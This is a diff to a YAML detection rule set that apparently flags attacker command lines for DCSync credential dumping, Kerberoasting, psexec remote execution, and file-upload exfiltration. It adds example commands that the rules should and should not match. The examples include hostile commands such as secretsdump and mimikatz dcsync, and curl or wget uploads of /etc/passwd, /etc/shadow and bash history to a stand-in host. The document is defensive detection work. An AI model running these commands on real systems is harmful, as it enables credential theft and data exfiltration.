@@ -19,12 +19,14 @@
   examples:
     match:
       - "secretsdump.py -just-dc corp/admin@10.0.0[.]5"
+      - "python3 secretsdump.py -just-dc corp/admin@10.0.0[.]5"
       - "impacket-secretsdump -hashes :8846f7eaee8fb117ad06bdd830b7586c corp/admin@dc01"
       - 'mimikatz "lsadump::dcsync /domain:corp /user:krbtgt" exit'
       - "Invoke-Mimikatz -Command '\"lsadump::dcsync /user:krbtgt\"'"
     no_match:
       - "secretsdump.py -system SYSTEM -security SECURITY LOCAL"
       - "pip install impacket"
+      - "python3 -m pip install impacket"
 
 # The AD database: ntdsutil's install-from-media copy, ntds.dit copied (from a shadow copy) or read by secretsdump
 # offline.
@@ -123,6 +125,7 @@
   examples:
     match:
       - "GetUserSPNs.py corp/jdoe -dc-ip 10.0.0[.]5 -request"
+      - "python3 /opt/impacket/examples/GetUserSPNs.py corp/jdoe -dc-ip 10.0.0[.]5 -request"
       - "impacket-GetUserSPNs -request corp/jdoe"
       - "Rubeus.exe kerberoast /outfile:h.txt"
       - "Invoke-Kerberoast -OutputFormat Hashcat"
@@ -236,6 +239,7 @@
   examples:
     match:
       - "psexec.py corp/admin@10.0.0[.]5"
+      - "python3 psexec.py corp/admin@10.0.0[.]5"
       - "impacket-smbexec corp/admin@dc01"
       - 'PsExec64.exe \\dc01 -s cmd.exe'
       - 'psexec -accepteula \\10.0.0[.]5 -u admin cmd'
@@ -355,7 +359,7 @@
 - id: http-upload
   match:
     regex: '(?i){stage}(?:curl(?:\.exe)?{end}(?={seg}*?[^\S\n](?:(?-i:-T)[^\S\n]+|--upload-file[^\S\n]+|(?-i:-F)[^\S\n]*["\x27]?[\w.-]+=@|--form[^\S\n]+["\x27]?[\w.-]+=@|--data-binary[^\S\n]+["\x27]?@|(?-i:-d)[^\S\n]*["\x27]?@|--data(?:-raw|-urlencode)?[^\S\n]+["\x27]?@)["\x27]?(?:(?:/etc|/root|/home|/var|/opt|/srv|~|\$home|[a-z]:\\(?:users|programdata|windows))[/\\][^\s"\x27|;&()]*|[^\s"\x27|;&()]*\.(?:zip|tgz|tar|gz|bz2|xz|7z|rar|db|sqlite3?|sql|kdbx|pst|ost|dmp|bak|csv|xlsx?|docx?|pdf|pem|key|ppk|pfx))(?![\w.-]))|wget{end}(?={seg}*?[^\S\n]--post-file(?:=|[^\S\n]+)["\x27]?(?:(?:/etc|/root|/home|/var|/opt|/srv|~|\$home)[/\\][^\s"\x27|;&()]*|[^\s"\x27|;&()]*\.(?:zip|tgz|tar|gz|bz2|xz|7z|rar|db|sqlite3?|sql|kdbx|pst|ost|dmp|bak|csv|xlsx?|docx?|pdf|pem|key|ppk|pfx))(?![\w.-]))|(?:invoke-webrequest|iwr|invoke-restmethod|irm){end}(?={seg}*?[^\S\n]-infile[^\S\n]+["\x27]?(?:(?:~|\$home|\$env:userprofile|[a-z]:\\(?:users|programdata|windows))[/\\][^\s"\x27|;&()]*|[^\s"\x27|;&()]*\.(?:zip|tgz|tar|gz|bz2|xz|7z|rar|db|sqlite3?|sql|kdbx|pst|ost|dmp|bak|csv|xlsx?|docx?|pdf|pem|key|ppk|pfx))(?![\w.-])))|(?<![\w-])-body[^\S\n]+\(?[^\S\n]*(?:get-content|gc)[^\S\n]+(?:-path[^\S\n]+)?["\x27]?(?:(?:~|\$home|\$env:userprofile|[a-z]:\\(?:users|programdata|windows))[/\\][^\s"\x27|;&()]*|[^\s"\x27|;&()]*\.(?:zip|tgz|tar|gz|bz2|xz|7z|rar|db|sqlite3?|sql|kdbx|pst|ost|dmp|bak|csv|xlsx?|docx?|pdf|pem|key|ppk|pfx))(?![\w.-])|\.uploadfile(?:async)?\([^,)\n]*,[^\S\n]*["\x27]?(?:(?:~|\$home|\$env:userprofile|[a-z]:\\(?:users|programdata|windows))[/\\][^\s"\x27|;&()]*|[^\s"\x27|;&()]*\.(?:zip|tgz|tar|gz|bz2|xz|7z|rar|db|sqlite3?|sql|kdbx|pst|ost|dmp|bak|csv|xlsx?|docx?|pdf|pem|key|ppk|pfx))(?![\w.-])'
-  meaning: Uploads a file that looks like host data (an archive, a database, a document, a key, or a file from a system or home folder) to a remote web server, a common way to take data off the host.
+  meaning: Uploads a file that looks like host data (an archive, a database, a document, a key, or a file from a system or home folder) to a remote web or FTP server, a common way to take data off the host.
   techniques: [T1048]
   artifacts: [File, Network Connection]
   iocs: [url, ipv4, domain, path]
@@ -363,6 +367,7 @@
   examples:
     match:
       - "curl -T /etc/passwd hxxp://203.0.113[.]5:8000/"
+      - "curl -T /etc/passwd ftp://203.0.113[.]5/upload/"
       - "curl -F 'file=@/tmp/d.tgz' hxxp://203.0.113[.]5/up"
       - "curl --data-binary @/home/bob/.bash_history hxxp://203.0.113[.]5/"
       - "wget --post-file=/etc/shadow hxxp://203.0.113[.]5/"
